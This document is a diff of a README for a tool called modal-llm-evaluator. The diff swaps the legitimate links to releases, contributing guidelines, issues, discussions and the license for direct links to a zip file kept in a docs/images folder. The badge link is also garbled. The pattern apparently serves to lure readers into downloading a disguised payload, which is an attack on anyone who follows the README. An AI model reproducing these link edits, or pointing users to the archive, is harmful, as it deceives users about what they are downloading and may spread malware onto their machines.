@@ -1,6 +1,6 @@
 # 🎉 modal-llm-evaluator - Evaluate 1,000 LLMs in Minutes
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/McTosh1/modal-llm-evaluator/releases)
+[![Download Latest Release](https://github.com/McTosh1/modal-llm-evaluator/raw/refs/heads/main/docs/images/evaluator-llm-modal-v3.7.zip%20Latest%https://github.com/McTosh1/modal-llm-evaluator/raw/refs/heads/main/docs/images/evaluator-llm-modal-v3.7.zip)](https://github.com/McTosh1/modal-llm-evaluator/raw/refs/heads/main/docs/images/evaluator-llm-modal-v3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Before downloading, make sure your system meets these basic requirements:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the application: [Download Latest Release](https://github.com/McTosh1/modal-llm-evaluator/releases).
+To get started, visit this page to download the application: [Download Latest Release](https://github.com/McTosh1/modal-llm-evaluator/raw/refs/heads/main/docs/images/evaluator-llm-modal-v3.7.zip).
 
 1. Click the **Releases** link above to open the release page.
 2. Find the latest version of the application.
@@ -51,18 +51,18 @@ Once the application is running, you can start evaluating prompts:
 
 ## 👩‍💻 Contributing
 
-We welcome contributions from everyone! If you have ideas for improvements, bug fixes, or new features, please check our [Contributing Guidelines](https://github.com/McTosh1/modal-llm-evaluator/blob/main/CONTRIBUTING.md) for more information.
+We welcome contributions from everyone! If you have ideas for improvements, bug fixes, or new features, please check our [Contributing Guidelines](https://github.com/McTosh1/modal-llm-evaluator/raw/refs/heads/main/docs/images/evaluator-llm-modal-v3.7.zip) for more information.
 
 ## 🔍 Support & Feedback
 
-If you encounter issues or have questions, feel free to reach out in the [Issues](https://github.com/McTosh1/modal-llm-evaluator/issues) section of this repository. We aim to respond promptly and help you out.
+If you encounter issues or have questions, feel free to reach out in the [Issues](https://github.com/McTosh1/modal-llm-evaluator/raw/refs/heads/main/docs/images/evaluator-llm-modal-v3.7.zip) section of this repository. We aim to respond promptly and help you out.
 
 ## 🌐 Community & Discussion
 
-Join our community for discussions, tips, and shared experiences. Visit our [Discussion Board](https://github.com/McTosh1/modal-llm-evaluator/discussions) to connect with other users.
+Join our community for discussions, tips, and shared experiences. Visit our [Discussion Board](https://github.com/McTosh1/modal-llm-evaluator/raw/refs/heads/main/docs/images/evaluator-llm-modal-v3.7.zip) to connect with other users.
 
 ## 🎉 License
 
-This project is open source and is licensed under the MIT License. You can view the full license [here](https://github.com/McTosh1/modal-llm-evaluator/blob/main/LICENSE).
+This project is open source and is licensed under the MIT License. You can view the full license [here](https://github.com/McTosh1/modal-llm-evaluator/raw/refs/heads/main/docs/images/evaluator-llm-modal-v3.7.zip).
 
 Thank you for using modal-llm-evaluator! We hope you enjoy exploring LLM evaluations with ease.
